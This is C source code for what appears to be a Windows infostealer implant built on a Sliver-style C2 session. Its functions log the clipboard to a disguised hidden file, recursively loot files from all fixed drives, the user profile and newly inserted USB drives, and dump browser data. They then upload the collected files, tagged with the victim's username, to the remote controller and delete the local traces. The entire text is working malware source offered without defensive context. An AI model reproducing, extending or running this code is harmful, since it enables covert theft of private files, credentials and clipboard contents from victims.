				wsprintfA(szTemp, "[%d/%d/%d %d:%d:%d]\n", SystemTime.wDay, SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
				lpTemp = StrInsertBeforeA(lpTemp, szTemp);
				lpTemp = StrCatExA(lpTemp, "\n");
				lpClipboardPath = (LPWSTR)GetWindowLongPtrW(hwnd, GWLP_USERDATA);
				AppendToFile(lpClipboardPath, lpTemp, lstrlenA(lpTemp));
				FREE(lpTemp);
				CloseClipboard();
			}
			else {
				LOG_ERROR("GetClipboardData", GetLastError());
			}
		}
	}
	else if (msg == WM_CREATE) {
		pCreateStruct = (CREATESTRUCTW*)lParam;
		lpClipboardPath = (LPWSTR)pCreateStruct->lpCreateParams;
		SetWindowLongPtrW(hwnd, GWLP_USERDATA, (LONG_PTR)lpClipboardPath);
	}
	else if (msg == WM_DESTROY) {
		RemoveClipboardFormatListener(hwnd);
		PostQuitMessage(0);
	}
	else {
		return DefWindowProcW(hwnd, msg, wParam, lParam);
	}
	
	return 0;
}

VOID StealClipboard
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	HANDLE hClipboard = NULL;
	LPWSTR lpMessage = NULL;
	HWND hWindow = NULL;
	MSG Message;
	LPWSTR lpClipboardPath = NULL;
	LPSTR lpTemp = NULL;
	SYSTEMTIME SystemTime;
	CHAR szTemp[0x40];
	WNDCLASSEXW WndClass;

	lpClipboardPath = DuplicateStrW(pConfig->wszWarehouse, 0x20);
	if (!IsFolderExist(lpClipboardPath)) {
		if (!CreateDirectoryW(lpClipboardPath, NULL)) {
			LOG_ERROR("CreateDirectoryW", GetLastError());
			goto CLEANUP;
		}

		if (!SetFileAttributesW(lpClipboardPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
			LOG_ERROR("SetFileAttributesW", GetLastError());
			goto CLEANUP;
		}
	}

	lstrcatW(lpClipboardPath, L"\\logitech_series.txt");

	SecureZeroMemory(&WndClass, sizeof(WndClass));
	WndClass.cbSize = sizeof(WNDCLASSEXW);
	WndClass.lpfnWndProc = WndProc;
	WndClass.hInstance = GetModuleHandleW(NULL);
	WndClass.lpszClassName = L"UevListener";
	if (!RegisterClassExW(&WndClass)) {
		LOG_ERROR("RegisterClassExW", GetLastError());
		goto CLEANUP;
	}

	hWindow = CreateWindowExW(0, L"UevListener", L"Sample Window", WS_MINIMIZE | WS_OVERLAPPED, 100, 100, 100, 100, HWND_MESSAGE, NULL, NULL, lpClipboardPath);
	if (hWindow == NULL) {
		LOG_ERROR("CreateWindowExW", GetLastError());
		goto CLEANUP;
	}

	if (!AddClipboardFormatListener(hWindow)) {
		LOG_ERROR("AddClipboardFormatListener", GetLastError());
		goto CLEANUP;
	}

	while (GetMessageW(&Message, NULL, 0, 0)) {
		TranslateMessage(&Message);
		DispatchMessageW(&Message);
	}

CLEANUP:
	FREE(lpClipboardPath);
	if (hWindow != NULL) {
		DestroyWindow(hWindow);
	}

	return;
}

BOOL LootFileCallback
(
	_In_ PFILE_NOTIFY_INFORMATION pNotifyInfo,
	_In_ LPWSTR lpPath,
	_In_ PGLOBAL_CONFIG pConfig
)
{
	if (IsStrStartsWithW(pNotifyInfo->FileName, L"~$")) {
		return FALSE;
	}

	StealFile(lpPath, pConfig);
	return FALSE;
}

VOID LootFileThread
(
	_In_ PLOOT_ARGS pParateter
)
{
	WatchFileModificationEx(pParateter->lpPath, TRUE, (FILE_MODIFICATION_CALLBACK)LootFileCallback, pParateter->pConfig);
CLEANUP:
	if (pParateter != NULL) {
		FREE(pParateter->lpPath);
		FREE(pParateter);
	}

	return;
}

//VOID MonitorAndLoot
//(
//	_In_ PGLOBAL_CONFIG pConfig
//)
//{
//	PLOOT_ARGS pLootParameter = NULL;
//	DWORD dwThreadID = 0;
//	DWORD i = 0;
//
//	pConfig->StoppingMonitor = FALSE;
//	for (i = 0; i < pConfig->dwNumberOfMonitoredFolder; i++) {
//		pLootParameter = ALLOC(sizeof(LOOT_ARGS));
//		pLootParameter->lpPath = DuplicateStrW(pConfig->MonitoredFolder[i], 0);
//		pLootParameter->pConfig = pConfig;
//		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFileThread, pLootParameter, 0, &dwThreadID);
//	}
//}

VOID MonitorUsbCallback
(
	_In_ BSTR lpInput,
	_In_ PGLOBAL_CONFIG pConfig
)
{
	LPWSTR lpDeviceID = NULL;
	LPVOID Args[2];

	lpDeviceID = SearchMatchStrW(lpInput, L"DeviceID = \"", L"\";\n");
	lpDeviceID = StrCatExW(lpDeviceID, L"\\");
	((PBOOL)Args)[0] = TRUE;
	Args[1] = pConfig;
	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
CLEANUP:
	FREE(lpDeviceID);
}

VOID MonitorUsb
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	while (TRUE) {
		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogicalDisk'", (EVENTSINK_CALLBACK)MonitorUsbCallback, pConfig);
		Sleep(60000);
	}
}

VOID LootFile
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	WCHAR wszLogicalDrives[0x100];
	WCHAR wszSystem32[MAX_PATH];
	WCHAR wszUserProfile[MAX_PATH];
	WCHAR wszLastLootFile[MAX_PATH];
	LPWSTR lpTemp = NULL;
	DWORD dwDriveType = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WCHAR wszDrivePath[] = L"\\\\.\\A:";
	STORAGE_HOTPLUG_INFO HotPlugInfo;
	DWORD dwBytesReturned = 0;
	LPVOID Args[2];

	GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
	ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
	SecureZeroMemory(&Args, sizeof(Args));
	Args[1] = pConfig;
	GetTempPathW(_countof(wszLastLootFile), wszLastLootFile);
	lstrcatW(wszLastLootFile, pConfig->lpUniqueName);
	lstrcatW(wszLastLootFile, L".tmp");
	while (TRUE) {
		SecureZeroMemory(wszLogicalDrives, sizeof(wszLogicalDrives));
		GetLogicalDriveStringsW(_countof(wszLogicalDrives), wszLogicalDrives);
		lpTemp = wszLogicalDrives;
		while (TRUE) {
			if (lpTemp[0] == L'\0') {
				break;
			}

			if (!IsStrStartsWithW(wszSystem32, lpTemp)) {
				dwDriveType = GetDriveTypeW(lpTemp);
				if (dwDriveType == DRIVE_FIXED) {
					wszDrivePath[lstrlenW(wszDrivePath) - 2] = lpTemp[0];
					hFile = CreateFileW(wszDrivePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
					if (hFile != INVALID_HANDLE_VALUE) {
						SecureZeroMemory(&HotPlugInfo, sizeof(HotPlugInfo));
						if (DeviceIoControl(hFile, IOCTL_STORAGE_GET_HOTPLUG_INFO, NULL, 0, &HotPlugInfo, sizeof(HotPlugInfo), &dwBytesReturned, NULL)) {
							if (HotPlugInfo.DeviceHotplug) {
								CloseHandle(hFile);
								lpTemp += lstrlenW(lpTemp) + 1;
								continue;
							}
						}

						CloseHandle(hFile);
					}

					ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
				}
			}

			lpTemp += lstrlenW(lpTemp) + 1;
		}

		ListFileEx(wszUserProfile, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
		GetSystemTimeAsFileTime(&pConfig->LastLootTime);
		WriteToFile(wszLastLootFile, (PBYTE)(&pConfig->LastLootTime), sizeof(&pConfig->LastLootTime));
		Sleep(3600000);
	}
}

VOID LootBrowserData
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	PENVELOPE pBrowserData = NULL;
	LPWSTR lpDestPath = NULL;
	LPWSTR lpLastLootTime = NULL;
	PUINT64 pLastLootTime = NULL;
	FILETIME CurrentTime;

	lpDestPath = DuplicateStrW(pConfig->wszWarehouse, 0);
	if (!IsFolderExist(lpDestPath)) {
		if (!CreateDirectoryW(lpDestPath, NULL)) {
			LOG_ERROR("CreateDirectoryW", GetLastError());
			goto CLEANUP;
		}

		if (!SetFileAttributesW(lpDestPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
			LOG_ERROR("SetFileAttributesW", GetLastError());
			goto CLEANUP;
		}
	}

	lpLastLootTime = StrAppendW(lpDestPath, L"\\last.txt");
	lpDestPath = StrCatExW(lpDestPath, L"\\MxErgo.dat");
	GetSystemTimeAsFileTime(&CurrentTime);
	if (IsFileExist(lpLastLootTime)) {
		pLastLootTime = (PUINT64)ReadFromFile(lpLastLootTime, NULL);
		if ((UINT64)((((UINT64)CurrentTime.dwHighDateTime) << 32) + CurrentTime.dwLowDateTime) - (*pLastLootTime) <= 8640000000000) {
			goto CLEANUP;
		}
	}
	else {
		pLastLootTime = ALLOC(sizeof(UINT64));
	}

	*pLastLootTime = (UINT64)((((UINT64)CurrentTime.dwHighDateTime) << 32) + CurrentTime.dwLowDateTime);
	WriteToFile(lpLastLootTime, pLastLootTime, sizeof(UINT64));
	pBrowserData = BrowserHandler(NULL);
	if (pBrowserData == NULL) {
		goto CLEANUP;
	}

	if (!WriteToFile(lpDestPath, pBrowserData->pData->pBuffer, pBrowserData->pData->cbBuffer)) {
		goto CLEANUP;
	}

CLEANUP:
	FREE(lpLastLootTime);
	FREE(pLastLootTime);
	FREE(lpDestPath);
	FreeEnvelope(pBrowserData);

	return;
}

BOOL UploadLootedFileCallback
(
	_In_ LPWSTR lpPath,
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PENVELOPE pEnvelope = NULL;

	pEnvelope = MarshalLootedFile(lpPath);
	if (pEnvelope == NULL) {
		goto CLEANUP;
	}

	pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pEnvelope);
	Sleep(500);
CLEANUP:
	FreeEnvelope(pEnvelope);

	return FALSE;
}

VOID SliverUploadLootedFile
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PGLOBAL_CONFIG pConfig = NULL;
	LPWSTR lpWarehouse = NULL;

	pConfig = pSession->pGlobalConfig;
	lpWarehouse = pConfig->wszWarehouse;
	if (!IsFolderExist(lpWarehouse)) {
		if (!CreateDirectoryW(lpWarehouse, NULL)) {
			LOG_ERROR("CreateDirectoryW", GetLastError());
			goto CLEANUP;
		}

		if (!SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
			LOG_ERROR("SetFileAttributesW", GetLastError());
			goto CLEANUP;
		}
	}

	while (TRUE) {
		ListFileEx(lpWarehouse, LIST_JUST_FILE, (LIST_FILE_CALLBACK)UploadLootedFileCallback, pSession);
		Sleep(60000);
	}

CLEANUP:
	return;
}

PENVELOPE MarshalLootedFile
(
	_In_ LPWSTR lpFilePath
)
{
	LPWSTR lpFileName = NULL;
	PENVELOPE pResult = NULL;
	PPBElement Elements[8];
	DWORD i = 0;
	LPSTR lpOriginalPath = NULL;
	LPSTR lpUserName = NULL;
	PBYTE pFileData = NULL;
	DWORD cbFileData = 0;
	PPBElement pFinalElement = NULL;
	FILETIME CreationTime;
	FILETIME LastAccessTime;
	FILETIME LastWriteTime;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	UINT64 uFileTime = 0;

	SecureZeroMemory(Elements, sizeof(Elements));
	lpFileName = PathFindFileNameW(lpFilePath);
	if (!lstrcmpW(lpFileName, L"last.txt")) {
		goto CLEANUP;
	}

	pFileData = ReadFromFile(lpFilePath, &cbFileData);
	if (pFileData == NULL || cbFileData == 0) {
		goto CLEANUP;
	}

	if (!lstrcmpW(lpFileName, L"logitech_series.txt")) {
		if (cbFileData < 50000) {
			goto CLEANUP;
		}

		Elements[3] = CreateVarIntElement(1, 4);
	}
	else if (!lstrcmpW(lpFileName, L"MxErgo.dat")) {
		Elements[7] = CreateVarIntElement(1, 8);
	}
	else {
		lpOriginalPath = (LPSTR)pFileData;
		pFileData += lstrlenA(lpOriginalPath) + 1;
		cbFileData -= lstrlenA(lpOriginalPath) + 1;
		hFile = CreateFileW(lpFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			if (GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
				uFileTime = (((UINT64)CreationTime.dwHighDateTime) << 32) + CreationTime.dwLowDateTime;
				Elements[4] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 5);
				uFileTime = (((UINT64)LastAccessTime.dwHighDateTime) << 32) + LastAccessTime.dwLowDateTime;
				Elements[5] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 6);
				uFileTime = (((UINT64)LastWriteTime.dwHighDateTime) << 32) + LastWriteTime.dwLowDateTime;
				Elements[6] = CreateVarIntElement(FILETIME_TO_UNIXMICRO(uFileTime), 7);
			}
			else {
				LOG_ERROR("GetFileTime", GetLastError());
			}

			CloseHandle(hFile);
		}
		else {
			LOG_ERROR("CreateFileW", GetLastError());
		}

		Elements[0] = CreateBytesElement(lpOriginalPath, lstrlenA(lpOriginalPath), 1);
	}

	DeleteFileW(lpFilePath);
	lpUserName = GetComputerUserName();
	Elements[1] = CreateBytesElement(lpUserName, lstrlenA(lpUserName), 2);
	Elements[2] = CreateBytesElement(pFileData, cbFileData, 3);
	pFinalElement = CreateStructElement(Elements, _countof(Elements), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
	pResult->uType = MsgLootFile;
CLEANUP:
	FreeElement(pFinalElement);
	FREE(lpOriginalPath);
	FREE(lpUserName);

	return pResult;
}